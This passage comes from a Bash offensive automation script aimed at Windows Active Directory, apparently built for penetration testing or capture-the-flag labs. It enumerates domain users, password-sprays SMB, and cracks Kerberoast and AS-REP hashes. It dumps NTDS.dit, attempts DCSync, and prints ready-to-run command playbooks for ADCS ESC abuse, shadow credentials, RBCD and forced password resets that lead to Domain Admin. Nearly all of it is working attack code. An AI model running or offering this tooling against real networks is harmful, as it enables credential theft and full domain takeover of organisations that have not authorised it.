        got=$(find "$dest" -type f 2>/dev/null | wc -l); n=$((n+got))
        [[ "$got" -gt 0 ]] && add_lead "[+] Downloaded $got file(s) from //$IP/$share" "grep -rabiE 'pass|cpass|secret|connectionstring' '$dest'"
    done <<< "$list"
    local hits
    hits=$(find "$LOOT/shares" -type f 2>/dev/null \
           | grep -aiE '\.(kdbx|config|xml|ini|ps1|psd1|bat|cmd|vbs|conf|cnf|ya?ml|json|pfx|p12|key|pem|ovpn|rdp|gpg|sql|bak|old)$' | head -n 25)
    if [[ -n "$hits" ]]; then
        printf '%s\n' "$hits" >> "$CUR_OUT"
        add_lead "[!] Interesting file type(s) in downloaded shares ($IP)" "$(printf '%s\n' "$hits" | wc -l) candidate file(s); see services/smb_loot.txt"
    fi
    [[ "$n" -gt 0 ]] && ok "Pulled $n file(s) into loot/shares/"
}

# build loot/users.txt from AUTHORITATIVE user sources only. The previous version
# scraped every "DOMAIN\word" in services/, which grabbed group-name fragments
# (Allowed RODC..., Cert Publishers, ...) and SYSVOL path pieces -> garbage users.
harvest_users() {
    [[ "$MODE" == "auth" ]] || return 0
    local uf="$LOOT/users.txt" tmp="$LOOT/.users.raw"; : > "$tmp"
    # 1) ldapsearch dump: sAMAccountName (authoritative, person objects only)
    [[ -f "$LOOT/ldap_userattrs_$IP.txt" ]] && \
        grep -aioE '^sAMAccountName:[[:space:]]*[^[:space:]]+' "$LOOT/ldap_userattrs_$IP.txt" | awk '{print $2}' >> "$tmp"
    # 2) rid-brute: ONLY (SidTypeUser) lines -> the SAM name before " (SidTypeUser)"
    #    (groups are SidTypeGroup/SidTypeAlias and are deliberately excluded)
    grep -rhaiE '\(SidTypeUser\)' "$SVCDIR" 2>/dev/null \
        | sed -E 's/.*\\([^\\ ]+)[[:space:]]*\(SidTypeUser\).*/\1/' >> "$tmp"
    # 3) ldapdomaindump grep file (col 3 = sAMAccountName)
    [[ -f "$LOOT/ldd/domain_users.grep" ]] && awk -F'\t' 'NR>1{print $3}' "$LOOT/ldd/domain_users.grep" 2>/dev/null >> "$tmp"
    # clean: strict username shape, drop machine accounts ($) + any stray markers
    grep -aviE '\$$' "$tmp" \
        | grep -aiE '^[A-Za-z0-9._-]{1,64}$' \
        | grep -avwiE 'SidTypeUser|SidTypeGroup|SidTypeAlias|Enumerated|krbtgt' \
        | sort -u > "$uf"
    local nu; nu=$(wc -l < "$uf" 2>/dev/null); nu=${nu//[!0-9]/}; nu=${nu:-0}
    if [[ "$nu" -gt 0 ]]; then
        ok "Harvested $nu unique username(s) -> loot/users.txt"
        add_lead "[+] $nu domain users enumerated ($IP)" "loot/users.txt (used for password spray)"
    fi
}

# turn nxc [+] success lines into leads. CRITICAL: lines annotated "(Guest)" are
# SMB guest-fallback (any user+any pass maps to Guest when the guest account is on)
# -> these are FALSE POSITIVES and must be dropped, not reported or fed back.
_spray_report() {   # $1 = nxc [+] lines  $2 = label  [$3 = svc, enables admin-cred capture]
    local out="$1" label="$2" svc="${3:-}" l tail user pw mark any=0
    while IFS= read -r l; do
        [[ -z "$l" ]] && continue
        echo "$l" | grep -qiE '\[\+\]'   || continue
        echo "$l" | grep -qiE '\(Guest\)' && continue        # guest fallback -> not a real cred
        tail=$(printf '%s' "${l##*\\}" | sed 's/[[:space:]]*$//')   # user:pass [(Pwn3d!)]
        user=$(printf '%s' "$tail" | sed -E 's/:.*$//')
        pw=$(printf '%s' "$tail" | sed -E 's/^[^:]*:(.*)$/\1/; s/ *\((Pwn3d!|Guest)\) *$//; s/[[:space:]]*$//')
        mark=""; echo "$l" | grep -qiE '\(Pwn3d!\)' && mark=" (Pwn3d!)"
        add_lead "[+] SPRAY HIT ($label) on $IP: ${user}:${pw}${mark}" "Valid credential discovered by spraying"
        [[ -n "$pw" ]] && printf '%s\n' "$pw" >> "$LOOT/candidate_secrets_$IP.txt"
        [[ -n "$pw" ]] && printf '%s\t%s\n' "$user" "$pw" >> "$LOOT/valid_creds.txt"   # for flag retrieval
        # record local-admin creds (SMB Pwn3d) so ntds_dump can use them
        [[ -n "$svc" && -n "$mark" ]] && printf '%s\t%s\n' "$user" "$pw" >> "$LOOT/pwned_${svc}_creds.txt"
        any=1
    done <<< "$out"
    [[ "$any" -eq 0 ]] && info "No real hits ($label)."
    return 0
}

# spray loot/users.txt against a wordlist (lockout-aware). aggressive-gated.
spray_passwords() {
    [[ "$AGGRESSIVE" -eq 1 ]] || return 0
    [[ "$MODE" == "auth" ]] || return 0
    local uf="$LOOT/users.txt"
    [[ -s "$uf" ]] || { info "No users.txt to spray."; return 0; }
    setout spray_pw "Password spray (users.txt x wordlist)"
    local nu; nu=$(wc -l < "$uf"); nu=${nu//[!0-9]/}

    # lockout threshold (parsed from saved pass-pol output)
    local src thr lockout=0 known=1
    src=$(grep -rhaiE 'Lockout Threshold' "$SVCDIR" 2>/dev/null | head -1)
    [[ -z "$src" ]] && known=0
    thr=$(printf '%s' "$src" | grep -aoiE '[0-9]+|none|never|disabled' | tail -1)
    if [[ -z "$thr" || "$thr" =~ ^([Nn]one|[Nn]ever|[Dd]isabled|0)$ ]]; then lockout=0; else lockout=$thr; fi
    if [[ "$known" -eq 0 ]]; then
        warn "Lockout policy unknown (no pass-pol data) - spraying full list anyway; Ctrl-C if unsure or pass --spray-wordlist a short list."
    elif [[ "$lockout" -eq 0 ]]; then info "Lockout threshold: none/0 -> full spray is safe."
    else warn "Lockout threshold = $lockout (use --spray-force to override the cap)."; fi

    # Phase A: username-as-password + blank password (1 attempt/user, low risk)
    local out
    info "Trying username-as-password and blank passwords ($nu users)..."
    out=$(capc "$TMO_LONG" "$PCQ nxc smb $IP -u $uf -p $uf --no-bruteforce ${DOMAIN:+-d '$DOMAIN'} --continue-on-success 2>&1 | grep -a '\[+\]'")
    _spray_report "$out" "user-as-pass" "smb"
    out=$(capc "$TMO_MED" "$PCQ nxc smb $IP -u $uf -p '' ${DOMAIN:+-d '$DOMAIN'} --continue-on-success 2>&1 | grep -a '\[+\]'")
    _spray_report "$out" "blank-pass" "smb"

    # Phase B: wordlist spray (cap to lockout-1 unless --spray-force)
    local wl; wl=$(find_wordlist spray)
    [[ -z "$wl" ]] && { warn "No spray wordlist found under /usr/share/seclists; skipping wordlist spray."; return 0; }
    local usewl="$wl" nwords; nwords=$(wc -l < "$wl"); nwords=${nwords//[!0-9]/}
    if [[ "$lockout" -gt 0 && "$SPRAY_FORCE" -ne 1 ]]; then
        local cap=$((lockout-1)); [[ "$cap" -lt 1 ]] && cap=1
        usewl="$LOOT/.spray_capped.txt"; head -n "$cap" "$wl" > "$usewl"; nwords=$cap
        warn "Capping spray to $cap password(s) to respect lockout=$lockout (full list: $wl)."
    fi
    warn "AGGRESSIVE spray: $nu users x $nwords passwords ($(basename "$wl")) - LOCKOUT/NOISE RISK."
    out=$(capc "$TMO_LONG" "$PCQ nxc smb $IP -u $uf -p $usewl ${DOMAIN:+-d '$DOMAIN'} --continue-on-success 2>&1 | grep -a '\[+\]'")
    _spray_report "$out" "wordlist" "smb"
}

# parse cracked output (hashcat 'hash:pass' or john --show 'user:pass') -> leads
_report_cracked() {  # $1 = cracked file, $2 = label
    local f="$1" label="$2" line user pw any=0
    [[ -s "$f" ]] || { info "No $label hashes cracked (wordlist/timeout)."; return 0; }
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        if printf '%s' "$line" | grep -qE '^\$krb5'; then
            pw="${line##*:}"
            user=$(printf '%s' "$line" | sed -nE 's/^\$krb5tgs\$[0-9]*\$\*([^$]+)\$.*/\1/p')
            [[ -z "$user" ]] && user=$(printf '%s' "$line" | sed -nE 's/^\$krb5asrep\$[0-9]*\$([^@]+)@.*/\1/p')
        else
            user="${line%%:*}"; pw=$(printf '%s' "$line" | awk -F: '{print $2}')
        fi
        [[ -z "$pw" || "$pw" == "$line" ]] && continue
        add_lead "[+] CRACKED $label: ${user:-?} : $pw" "Working credential (cracked offline)"
        printf '%s\n' "$pw" >> "$LOOT/candidate_secrets_$IP.txt"
        any=1
    done < "$f"
    [[ "$any" -eq 0 ]] && info "No $label plaintext recovered."
    return 0
}

_crack_one() {  # $1 cracker  $2 mode  $3 hashfile  $4 wordlist  $5 label
    local cracker="$1" mode="$2" hf="$3" wl="$4" label="$5" outp="$LOOT/cracked_${label}.txt"
    setout crack "Crack $label ($(wc -l <"$hf") hash(es) x $(basename "$wl"))"
    info "Cracking $label with $cracker (timeout ${CRACK_TIMEOUT}s)..."
    if [[ "$cracker" == "hashcat" ]]; then
        runc "$CRACK_TIMEOUT" "hashcat -m $mode -a 0 --quiet --force --potfile-path '$LOOT/hc_${label}.pot' -o '$outp' '$hf' '$wl' 2>&1 | tail -n 6"
        capc "$TMO_SHORT" "hashcat -m $mode --quiet --show --potfile-path '$LOOT/hc_${label}.pot' '$hf' 2>&1" > "$outp" 2>/dev/null
    else
        local jfmt; [[ "$mode" == "13100" ]] && jfmt=krb5tgs || jfmt=krb5asrep
        runc "$CRACK_TIMEOUT" "john --format=$jfmt --wordlist='$wl' '$hf' 2>&1 | tail -n 6"
        capc "$TMO_SHORT" "john --show --format=$jfmt '$hf' 2>&1 | grep -aE ':'" > "$outp" 2>/dev/null
    fi
    _report_cracked "$outp" "$label"
}

# crack any harvested Kerberoast / AS-REP hashes (offline, safe -> not aggressive-gated)
crack_hashes() {
    [[ "$MODE" == "auth" ]] || return 0
    local cracker=""
    if have hashcat; then cracker=hashcat; elif have john; then cracker=john; else
        info "Neither hashcat nor john installed; skipping hash cracking."; return 0; fi
    local wl; wl=$(find_wordlist crack)
    [[ -z "$wl" ]] && { info "No crack wordlist (rockyou) found; skipping."; return 0; }
    local kerb="$LOOT/_kerb_all.txt" asrep="$LOOT/_asrep_all.txt"
    cat "$LOOT"/kerb_*.txt "$LOOT"/tgtroast_*.txt 2>/dev/null | grep -aE '^\$krb5tgs\$'   | sort -u > "$kerb"
    cat "$LOOT"/asrep_*.txt 2>/dev/null               | grep -aE '^\$krb5asrep\$' | sort -u > "$asrep"
    [[ ! -s "$kerb" && ! -s "$asrep" ]] && { info "No Kerberoast/AS-REP hashes harvested to crack."; return 0; }
    [[ -s "$kerb"  ]] && _crack_one "$cracker" 13100 "$kerb"  "$wl" "Kerberoast"
    [[ -s "$asrep" ]] && _crack_one "$cracker" 18200 "$asrep" "$wl" "AS-REP"
}


# ════════════════════════════════════════════════════════════════════════════
#  NTDS.dit dump + BloodHound JQ analysis (IPPSEC-style) + auto-DCSync
# ════════════════════════════════════════════════════════════════════════════

# Dump NTDS.dit with nxc using ANY local-admin credential we hold: the creds from
# the command line AND admin creds discovered on the go (spray/cred-spray Pwn3d).
ntds_dump() {
    [[ "$MODE" == "auth" ]] || return 0
    need nxc "NTDS dump" || return 0
    setout ntds "NTDS.dit dump (nxc --ntds)"
    local tried="$LOOT/.ntds_tried"; : > "$tried"
    local cand="$LOOT/.ntds_candidates" u p auth chk out done_dump=0
    # candidates: initial creds first, then any SMB-Pwn3d creds we captured
    { printf '%s\t%s\n' "$USER" "$PASS"
      [[ -s "$LOOT/pwned_smb_creds.txt" ]] && cat "$LOOT/pwned_smb_creds.txt"
    } | awk 'NF' | sort -u > "$cand"
    while IFS=$'\t' read -r u p; do
        [[ -z "$u" ]] && continue
        grep -qxF "$u:$p" "$tried" 2>/dev/null && continue
        echo "$u:$p" >> "$tried"
        if [[ -n "$p" ]]; then auth="-u '$u' -p '$p' ${DOMAIN:+-d '$DOMAIN'}"
        elif [[ -n "$HASH" && "$u" == "$USER" ]]; then auth="-u '$u' -H '$HASH' ${DOMAIN:+-d '$DOMAIN'}"
        else continue; fi
        chk=$(capc "$TMO_SHORT" "$PCQ nxc smb $IP $auth 2>&1")
        if echo "$chk" | grep -qiE '\(Pwn3d!\)'; then
            info "Local admin confirmed for '$u' -> dumping NTDS.dit"
            out=$(capc "$TMO_LONG" "$PCQ nxc smb $IP $auth --ntds 2>&1 | tee $LOOT/ntds_$IP.txt")
            if echo "$out" | grep -qaE ':::'; then
                local n; n=$(grep -acE ':[0-9a-f]{32}:::' "$LOOT/ntds_$IP.txt" 2>/dev/null); n=${n:-0}
                add_lead "[!] NTDS.dit DUMPED via '$u' (${n} hashes) on $IP" "loot/ntds_$IP.txt -> PtH Administrator; crack NT hashes with hashcat -m 1000"
                done_dump=1; break
            fi
        fi
    done < "$cand"
    [[ "$done_dump" -eq 0 ]] && info "No local-admin credential available for NTDS (need DA/admin or DCSync rights)."
}

# attempt nxc DCSync (--ntds) with a credential that BloodHound says holds DCSync.
# $1 = newline-separated principal NAMES that can DCSync. aggressive-gated.
_attempt_dcsync() {
    local names="$1" u p out
    [[ "$AGGRESSIVE" -eq 1 ]] || { info "DCSync principals found; re-run with --aggressive to auto-dump."; return 0; }
    # try the authenticating user if it's among the DCSync principals
    if printf '%s\n' "$names" | grep -qiwF "$USER"; then
        local auth="-u '$USER' ${PASS:+-p '$PASS'} ${HASH:+-H '$HASH'} ${DOMAIN:+-d '$DOMAIN'}"
        out=$(capc "$TMO_LONG" "$PCQ nxc smb $IP $auth --ntds 2>&1 | tee $LOOT/ntds_dcsync_$IP.txt")
        echo "$out" | grep -qaE ':::' && { add_lead "[!] DCSync SUCCESS via '$USER' on $IP" "loot/ntds_dcsync_$IP.txt -> full domain hashes"; return 0; }
    fi
    # try any discovered credential whose user is a DCSync principal
    if [[ -s "$LOOT/pwned_smb_creds.txt" ]]; then
        while IFS=$'\t' read -r u p; do
            printf '%s\n' "$names" | grep -qiwF "$u" || continue
            out=$(capc "$TMO_LONG" "$PCQ nxc smb $IP -u '$u' -p '$p' ${DOMAIN:+-d '$DOMAIN'} --ntds 2>&1 | tee $LOOT/ntds_dcsync_$IP.txt")
            echo "$out" | grep -qaE ':::' && { add_lead "[!] DCSync SUCCESS via '$u' on $IP" "loot/ntds_dcsync_$IP.txt -> full domain hashes"; return 0; }
        done < "$LOOT/pwned_smb_creds.txt"
    fi
    info "DCSync principals identified but none match a credential we hold yet (own one of them, then re-run)."
}

# IPPSEC-style: unzip BloodHound JSON and mine it with jq for vulnerable users/
# ---------------------------------------------------------------------------
# ADCS / certipy ESC analysis -> writes loot/adcs_analysis.txt (a PLAYBOOK the
# dashboard renders as route cards, same format as the BloodHound playbook).
# Parses the text output of `certipy find -vulnerable -stdout`.
# ---------------------------------------------------------------------------
_emit_adcs() {  # $1 esc  $2 template  $3 ca
    local esc="$1" t="$2" ca="$3" U="${USER}" DOM="${DOMAIN}" ip="${IP}"
    local HT="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"
    echo "  ════════ ADCS ${esc}: template '${t}' on CA '${ca}'  (=> Domain Admin) ════════"
    echo "    WHO does it : any account allowed to enroll (you have '${U}')"
    case "$esc" in
      ESC1|ESC2|ESC6|ESC9|ESC10|ESC13|ESC14|ESC15|ESC16)
        echo "    ── ROUTE · ${esc} — request a cert AS Administrator, then authenticate ──"
        echo "      1) certipy req -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -template '${t}' -upn 'administrator@${DOM}'"
        echo "      2) certipy auth -pfx 'administrator.pfx' -dc-ip ${ip}"
        echo "      3) nxc winrm ${ip} -u Administrator -H '<administrator_hash>'"
        echo "      ↳ ${HT}" ;;
      ESC3)
        echo "    ── ROUTE · ESC3 — Enrollment-Agent cert, then enrol on-behalf-of Administrator ──"
        echo "      1) certipy req -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -template '${t}'   # the Enrollment Agent cert"
        echo "      2) certipy req -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -template User -on-behalf-of '${DOM}\\Administrator' -pfx '${U}.pfx'"
        echo "      3) certipy auth -pfx 'administrator.pfx' -dc-ip ${ip} ; nxc winrm ${ip} -u Administrator -H '<hash>'"
        echo "      ↳ ${HT}" ;;
      ESC4)
        echo "    ── ROUTE · ESC4 — you can WRITE the template: make it ESC1, then exploit ──"
        echo "      1) certipy template -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -template '${t}' -write-default-configuration"
        echo "      2) certipy req -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -template '${t}' -upn 'administrator@${DOM}'"
        echo "      3) certipy auth -pfx 'administrator.pfx' -dc-ip ${ip} ; nxc winrm ${ip} -u Administrator -H '<hash>'"
        echo "      ↳ ${HT}" ;;
      ESC7)
        echo "    ── ROUTE · ESC7 — abuse Manage CA / Manage Certificates ──"
        echo "      1) certipy ca -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -add-officer '${U}'"
        echo "      2) certipy ca -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -enable-template SubCA"
        echo "      3) certipy req -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -template SubCA -upn 'administrator@${DOM}'   # denied -> note the request ID"
        echo "      4) certipy ca -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -ca '${ca}' -issue-request <ID> ; certipy req ... -retrieve <ID>"
        echo "      5) certipy auth -pfx 'administrator.pfx' -dc-ip ${ip} ; nxc winrm ${ip} -u Administrator -H '<hash>'"
        echo "      ↳ ${HT}" ;;
      ESC8)
        echo "    ── ROUTE · ESC8 — NTLM-relay a DC to the CA web-enrollment endpoint ──"
        echo "      1) certipy relay -target 'http://${ca}/certsrv/certfnsh.asp' -template DomainController   # or ntlmrelayx.py --target http://${ca}/certsrv/certfnsh.asp"
        echo "      2) coerce a DC to authenticate to you (PetitPotam / printerbug / Coercer):"
        echo "         python3 PetitPotam.py -u '${U}' -p '<password>' -d '${DOM}' <your-ip> ${ip}"
        echo "      3) certipy auth -pfx 'dc.pfx' -dc-ip ${ip}    # DC\$ TGT -> DCSync the domain"
        echo "         nxc smb ${ip} -u 'DC\$' -H '<dc_hash>' --ntds"
        echo "      ↳ ${HT}" ;;
      *)
        echo "    ── ROUTE · ${esc} — confirm the template, then follow HackTricks ──"
        echo "      1) certipy find -u '${U}@${DOM}' -p '<password>' -dc-ip ${ip} -vulnerable -stdout"
        echo "      2) abuse ${esc} on template '${t}' (CA '${ca}')"
        echo "      ↳ ${HT}" ;;
    esac
    echo ""
}

adcs_analyze() {  # $1 = certipy text output file
    local src="$1" an="$LOOT/adcs_analysis.txt"
    [[ -s "$src" ]] || return 0
    local HT="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"
    local ca; ca=$(grep -aE '^[[:space:]]*CA Name[[:space:]]*:' "$src" | head -1 | sed -E 's/.*:[[:space:]]*//' | tr -d '\r')
    [[ -z "$ca" ]] && ca='<CA>'
    local pairs; pairs=$(awk '
        /Template Name[[:space:]]*:/ { t=$0; sub(/.*:[[:space:]]*/,"",t); sub(/\r/,"",t) }
        /^[[:space:]]+ESC[0-9]+[[:space:]]*:/ { e=$0; sub(/^[[:space:]]*/,"",e); sub(/[[:space:]]*:.*/,"",e); if(t!="") print e "\t" t }
    ' "$src" | sort -u)
    [[ -z "$pairs" ]] && return 0

    setout adcs "ADCS / certipy ESC analysis"
    : > "$an"
    { echo "== ADCS vulnerable certificate templates =="
      printf '%s\n' "$pairs" | while IFS=$'\t' read -r e t; do printf '    %s --vulnerable--> %s (template)\n' "$e" "$t"; done
      echo ""
      echo "== PLAYBOOK (ADCS) =="
    } >> "$an"
    echo "  ADCS vulnerable templates (CA '${ca}'):"
    printf '%s\n' "$pairs" | while IFS=$'\t' read -r e t; do
        echo "    ${e} : ${t}"
        add_lead "[!!] ADCS ${e} on template '${t}' ($IP)" "certipy req -ca '${ca}' -template '${t}' -upn administrator@${DOMAIN} ; see loot/adcs_analysis.txt"
        _emit_adcs "$e" "$t" "$ca" >> "$an"
    done
    info "ADCS playbook written -> loot/adcs_analysis.txt"
}

# NTDS.dit dump + BloodHound JQ analysis (IPPSEC-style) + auto-DCSync over
# computers, then auto-DCSync if a controllable principal has replication rights.
parse_bloodhound() {
    [[ "$MODE" == "auth" ]] || return 0
    # --- locate BloodHound JSON ----------------------------------------------
    # bloodhound-python writes loose *_<type>.json to the -op dir AND a --zip
    # archive; that archive is sometimes created EMPTY (a known quirk), so prefer
    # the loose files and fall back to extracting the zip. Exclude ldapdomaindump
    # JSON under loot/ldd/.
    local U C G D jd="$LOOT/bh_json"
    U=$(find "$LOOT" -maxdepth 3 -type f -iname '*_users.json' -not -path '*/ldd/*' 2>/dev/null | sort | tail -1)
    if [[ -z "$U" ]]; then
        local zip; zip=$(ls -t "$LOOT"/bh_*.zip 2>/dev/null | head -1)
        [[ -z "$zip" ]] && return 0   # no collection at all -> stay quiet
        have unzip || { add_lead "[*] BloodHound collected but unzip missing ($IP)" "apt install unzip"; return 0; }
        [[ $(stat -c%s "$zip" 2>/dev/null || echo 0) -lt 100 ]] && \
            add_lead "[*] BloodHound --zip archive is empty ($IP)" "Known bloodhound-python quirk; the loose *_users.json in loot/ are used automatically when present"
        rm -rf "$jd"; mkdir -p "$jd"; unzip -o -q "$zip" -d "$jd" 2>/dev/null
        U=$(find "$jd" -type f -iname '*_users.json' 2>/dev/null | head -1)
    fi
    [[ -z "$U" ]] && { add_lead "[*] BloodHound JSON not found ($IP)" "No loose *_users.json and the zip was empty/unextractable; check loot/"; return 0; }
    if ! have jq; then add_lead "[*] BloodHound data present but jq not installed ($IP)" "apt install jq -> re-run for the analysis"; return 0; fi
    local bdir; bdir=$(dirname "$U")
    C=$(find "$bdir" -maxdepth 1 -type f -iname '*_computers.json' 2>/dev/null | head -1)
    G=$(find "$bdir" -maxdepth 1 -type f -iname '*_groups.json'    2>/dev/null | head -1)
    D=$(find "$bdir" -maxdepth 1 -type f -iname '*_domains.json'   2>/dev/null | head -1)
    setout bhjq "BloodHound analysis (jq, IPPSEC-style)"
    local an="$LOOT/bh_analysis.txt"; : > "$an"

    _bhq() {  # $1 jq-filter  $2 file  $3 header  [$4 lead-msg] -> sets BHQ_RES, returns 0 if found
        BHQ_RES=$(jq -r "$1" "$2" 2>/dev/null | sed '/^null$/d;/^[[:space:]]*$/d' | sort -u)
        [[ -z "$BHQ_RES" ]] && return 1
        { echo "== $3 =="; printf '%s\n\n' "$BHQ_RES"; } >> "$an"
        echo "  $3:"; printf '%s\n' "$BHQ_RES" | sed 's/^/    /'
        [[ -n "$4" ]] && add_lead "$4" "See loot/bh_analysis.txt"
        return 0
    }

    local HT="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology"
    # owned identities: credentials provided on the CLI + everything discovered on the way
    local owned bfiles=()
    [[ -n "$U" ]] && bfiles+=("$U"); [[ -n "$G" ]] && bfiles+=("$G"); [[ -n "$C" ]] && bfiles+=("$C")
    owned=$( { printf '%s\n' "$USER"; [[ -s "$LOOT/valid_creds.txt" ]] && cut -f1 "$LOOT/valid_creds.txt"; } \
             | sed 's/@.*//; /^[[:space:]]*$/d' | tr 'A-Z' 'a-z' | sort -u )
    _bh_name() { jq -r --arg s "$1" '.data[]|select(.ObjectIdentifier==$s)|.Properties.samaccountname//.Properties.name' "${bfiles[@]}" 2>/dev/null | sed '/^null$/d' | head -1; }
    _bh_idents() { local nm m; nm=$(_bh_name "$1"); [[ -n "$nm" ]] && printf '%s\n' "$nm"
                   while IFS= read -r m; do [[ -n "$m" ]] && _bh_name "$m"; done \
                     < <(jq -r --arg s "$1" '.data[]|select(.ObjectIdentifier==$s)|.Members[]?.ObjectIdentifier' "$G" 2>/dev/null); }
    _owned_via() { _bh_idents "$1" | sed 's/@.*//' | tr 'A-Z' 'a-z' | sort -u | comm -12 - <(printf '%s\n' "$owned") | head -1; }
    # explicit, account-specific two-route privesc emitter for a controlled computer
    _emit_computer_takeover() {  # $1 who  $2 principal  $3 right  $4 computer
        local who="$1" prin="$2" right="$3" comp="$4" short
        short="${comp%%.*}"
        {
        echo "  ════════ PRIVESC: '$who' has $right over computer ${short}\$  (=> Domain Admin) ════════"
        echo "    WHO does it : '$who'   (you hold this credential)"
        [[ "$who" != "$prin" ]] && echo "                  └─ inherited via membership in group '$prin'"
        echo "    WHAT to do  : abuse $right on the computer object ${short}\$  (this host is the DC). Pick ONE route:"
        echo ""
        echo "    ── ROUTE A · Shadow Credentials (cleanest; PKINIT available here) ──"
        echo "      1) write a Key Credential to ${short}\$ and auto-recover its hash via PKINIT:"
        echo "         certipy shadow auto -u '${who}@${DOMAIN}' -p '<password>' -account '${short}\$' -dc-ip ${IP}"
        echo "      2) that ${short}\$ NT hash is the DC machine account -> DCSync the whole domain:"
        echo "         nxc smb ${IP} -u '${short}\$' -H '<DC_hash>' --ntds"
        echo "         # or: secretsdump.py -just-dc '${DOMAIN}/${short}\$@${IP}' -hashes ':<DC_hash>'"
        echo "      3) Pass-the-Hash as Administrator with the recovered hash:"
        echo "         nxc winrm ${IP} -u Administrator -H '<Administrator_hash>'"
        echo "      ↳ ${HT}/shadow-credentials.html"
        echo ""
        echo "    ── ROUTE B · Resource-Based Constrained Delegation (RBCD) ──"
        echo "      1) add a computer you control (MachineAccountQuota is 10 by default):"
        echo "         addcomputer.py -computer-name 'EVIL\$' -computer-pass 'Evil1234!' -dc-ip ${IP} '${DOMAIN}/${who}:<password>'"
        echo "      2) use your $right to let EVIL\$ delegate onto ${short}\$:"
        echo "         rbcd.py -delegate-from 'EVIL\$' -delegate-to '${short}\$' -action write -dc-ip ${IP} '${DOMAIN}/${who}:<password>'"
        echo "      3) request a ticket as Administrator for a service on the DC:"
        echo "         getST.py -spn 'cifs/${comp}' -impersonate Administrator -dc-ip ${IP} '${DOMAIN}/EVIL\$:Evil1234!'"
        echo "      4) use it:  export KRB5CCNAME=Administrator.ccache ; nxc smb ${comp} -k --ntds"
        echo "      ↳ ${HT}/resource-based-constrained-delegation.html"
        echo ""
        echo "    NOTE: <password> for '${who}' is in loot/valid_creds.txt; <*_hash> values come from the step output."
        echo ""
        } | tee -a "$an"
    }

    # explicit routes for control over a USER object (reset / shadow-creds / targeted roast)
    _emit_user_takeover() {  # $1 who  $2 principal  $3 right  $4 targetuser
        local who="$1" prin="$2" right="$3" tgt="$4"; tgt="${tgt%@*}"
        {
        echo "  ════════ OBJECT CONTROL: '$who' has $right over user '${tgt}' ════════"
        echo "    WHO does it : '$who'   (you hold this credential)"
        [[ "$who" != "$prin" ]] && echo "                  └─ inherited via membership in group '$prin'"
        case "$right" in
          WriteOwner|writeowner)
            echo "    PRE  : WriteOwner only -> take ownership, then grant yourself FullControl:"
            echo "         owneredit.py -action write -new-owner '${who}' -target '${tgt}' '${DOMAIN}/${who}:<password>' -dc-ip ${IP}"
            echo "         dacledit.py -action write -rights FullControl -principal '${who}' -target '${tgt}' '${DOMAIN}/${who}:<password>' -dc-ip ${IP}" ;;
          WriteDacl|writedacl)
            echo "    PRE  : WriteDacl only -> grant yourself FullControl first:"
            echo "         dacledit.py -action write -rights FullControl -principal '${who}' -target '${tgt}' '${DOMAIN}/${who}:<password>' -dc-ip ${IP}" ;;
        esac
        echo ""
        echo "    ── ROUTE A · Shadow Credentials on the user (stealthy; no password change) ──"
        echo "      1) add a Key Credential to '${tgt}', recover a TGT + its NT hash:"
        echo "         certipy shadow auto -u '${who}@${DOMAIN}' -p '<password>' -account '${tgt}' -dc-ip ${IP}"
        echo "      2) use the recovered hash as '${tgt}' (PtH), or the TGT:"
        echo "         nxc smb ${IP} -u '${tgt}' -H '<${tgt}_hash>'"
        echo "      ↳ ${HT}/shadow-credentials.html"
        echo ""
        case "$right" in
          GenericAll|genericall|GenericWrite|genericwrite|WriteOwner|writeowner|WriteDacl|writedacl)
            echo "    ── ROUTE B · Targeted Kerberoasting (write a fake SPN, roast, crack) ──"
            echo "      1) set an SPN on '${tgt}', request its TGS, then clean up:"
            echo "         targetedKerberoast.py -v -d '${DOMAIN}' -u '${who}' -p '<password>' --request-user '${tgt}'"
            echo "      2) crack the \$krb5tgs\$ hash offline:"
            echo "         hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt"
            echo "      ↳ ${HT}/kerberoast.html"
            echo "" ;;
        esac
        case "$right" in
          GenericAll|genericall|ForceChangePassword|forcechangepassword|AllExtendedRights|allextendedrights|WriteOwner|writeowner|WriteDacl|writedacl)
            echo "    ── ROUTE C · Force-reset the password (loud; changes their creds) ──"
            echo "      net rpc password '${tgt}' 'NewP@ss123!' -U '${DOMAIN}/${who}%<password>' -S ${IP}"
            echo "         (or) bloodyAD -u '${who}' -p '<password>' -d '${DOMAIN}' --host ${IP} set password '${tgt}' 'NewP@ss123!'"
            echo "      ↳ ${HT}/acl-persistence-abuse/index.html"
            echo "" ;;
        esac
        echo "    NOTE: prefer ROUTE A/B (no password change). <password> for '${who}' is in loot/valid_creds.txt."
        echo ""
        } | tee -a "$an"
    }

    # explicit route for control over a GROUP object (add yourself -> inherit its rights)
    _emit_group_takeover() {  # $1 who  $2 principal  $3 right  $4 targetgroup
        local who="$1" prin="$2" right="$3" grp="$4"; grp="${grp%@*}"
        {
        echo "  ════════ GROUP CONTROL: '$who' has $right over group '${grp}' ════════"
        echo "    WHO does it : '$who'   (you hold this credential)"
        [[ "$who" != "$prin" ]] && echo "                  └─ inherited via membership in group '$prin'"
        case "$right" in
          WriteOwner|writeowner)
            echo "    PRE  : WriteOwner only -> take ownership, then grant yourself write-members:"
            echo "         owneredit.py -action write -new-owner '${who}' -target '${grp}' '${DOMAIN}/${who}:<password>' -dc-ip ${IP}"
            echo "         dacledit.py -action write -rights WriteMembers -principal '${who}' -target '${grp}' '${DOMAIN}/${who}:<password>' -dc-ip ${IP}" ;;
          WriteDacl|writedacl)
            echo "    PRE  : WriteDacl only -> grant yourself write-members first:"
